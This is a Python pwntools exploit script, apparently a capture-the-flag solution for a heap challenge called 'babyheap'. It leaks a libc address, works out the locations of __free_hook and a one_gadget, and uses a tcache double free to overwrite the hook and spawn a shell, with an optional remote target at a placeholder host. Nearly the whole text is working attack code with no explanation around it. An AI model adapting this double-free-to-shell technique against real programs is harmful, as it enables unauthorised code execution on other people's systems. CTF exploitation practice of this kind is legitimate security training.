#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep

context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./babyheap"
libc = ELF("./libc.so.6")
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("example.com", 4444)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
		b *main+159
        c
        loadsym
        c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)


def alloc(data):
    p.recvuntil(">")
    p.sendline("1")
    p.recvuntil(":")
    p.send(data)

def delete():
    p.recvuntil(">")
    p.sendline("2")

def wipe():
    """ wipe chunk pointer """
    p.recvuntil(">")
    p.sendline("3")

# get stdin address
p.recvuntil(">>>>> ")
libc_stdin_addr = eval(p.recv(14))
#libc_base = libc_stdin_addr - libc.symbols['stdin'] + 0xe50
libc_base = libc_stdin_addr - libc.symbols['_IO_2_1_stdin_']
log.info("libc base: 0x{:08x}".format(libc_base))
libc_free_hook_addr = libc_base + libc.symbols['__free_hook']
log.info("__free_fook: 0x{:08x}".format(libc_free_hook_addr))
one_gadget_offset = 0x4f322
libc_one_gadget = libc_base + one_gadget_offset
log.info("one_gadget: 0x{:08x}".format(libc_one_gadget))

alloc(p64(0xdeadbeef))
# double free
delete()
delete()
wipe()
alloc(p64(libc_free_hook_addr))
wipe()
alloc(p64(0xdeadbeef))
wipe()
# we can malloc __free_hook
alloc(p64(libc_one_gadget))
# exec One-Gadget
delete()

p.interactive()
